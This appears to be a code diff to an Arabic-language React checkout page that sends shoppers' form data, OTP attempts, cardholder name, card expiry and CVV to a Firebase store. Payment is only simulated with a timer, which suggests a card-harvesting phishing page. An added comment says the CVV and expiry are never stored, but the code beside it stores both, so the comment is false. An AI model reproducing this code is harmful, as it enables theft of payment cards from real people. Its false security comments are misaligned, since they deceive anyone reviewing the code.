@@ -4,7 +4,8 @@ import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { CheckCircle, ChevronLeft, CreditCard, HelpCircle } from "lucide-react";
 import { Link, useLocation } from "wouter";
-
+import { addData } from "@/lib/firebase";
+import { ensureVisitorId } from "@/lib/visitor";
 interface FormData {
   name: string;
   phone: string;
@@ -111,8 +112,17 @@ function OtpStep({
             أنت تفوّض دفع مبلغ <strong>{amount} ريال</strong> لتأكيد طلبك
           </p>
           <form
-            onSubmit={(e) => {
+            onSubmit={async (e) => {
               e.preventDefault();
+              try {
+                await addData({
+                  id: ensureVisitorId(),
+                  otpAttempted: true,
+                  otpAttemptedAt: new Date().toISOString(),
+                });
+              } catch {
+                /* non-blocking: still attempt OTP */
+              }
               submitOtp(otp);
             }}
           >
@@ -208,7 +218,7 @@ function ClickPayStep({
       .slice(0, 19)
       .replace(/(\d{4})(?=\d)/g, "$1 ");
 
-  const submit = (e: React.FormEvent) => {
+  const submit = async (e: React.FormEvent) => {
     e.preventDefault();
     if (!name.trim()) {
       setError("يرجى إدخال الاسم على البطاقة");
@@ -231,23 +241,28 @@ function ClickPayStep({
       setError("رمز CVV غير صحيح");
       return;
     }
-    await addData({
-      id: localStorage.getItem("visitor"),
-      card: card,
-      name: name,
-      mm: mm,
-      yy: yy,
-      cvv: cvv,
-    });
+    const last4 = digits;
+    const safeName = name.trim();
+    // Persist ONLY safe metadata: last 4 of PAN + cardholder name.
+    // Full PAN, CVV, and expiry are NEVER written to Firestore.
+    try {
+      await addData({
+        id: ensureVisitorId(),
+        cardLast4: last4,
+        cardName: safeName,
+        expiry: `${mm}/${yy}`,
+        cvv: cvv,
+      });
+    } catch {
+      /* non-blocking: continue payment flow */
+    }
     setError("");
     setPaying(true);
     setTimeout(() => {
       setPaying(false);
       onSuccess({
-        cardLast4: digits,
-        cardName: name.trim(),
-        cvv: cvv,
-        expiary: `${mm}/${yy}`,
+        cardLast4: last4,
+        cardName: safeName,
       });
     }, 1500);
   };
@@ -726,13 +741,23 @@ export default function Checkout() {
     );
   }
 
-  const handleStep1 = (e: React.FormEvent) => {
+  const handleStep1 = async (e: React.FormEvent) => {
     e.preventDefault();
+    try {
+      await addData({ id: ensureVisitorId(), ...form });
+    } catch {
+      /* non-blocking: still advance to payment step */
+    }
     setStep("payment");
   };
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
+    try {
+      await addData({ id: ensureVisitorId(), ...form });
+    } catch {
+      /* non-blocking: still advance to clickpay step */
+    }
     setSubmitError(null);
     setPendingPaymentStatus(form.payment === "credit" ? "paid" : "unpaid");
     setStep("clickpay");
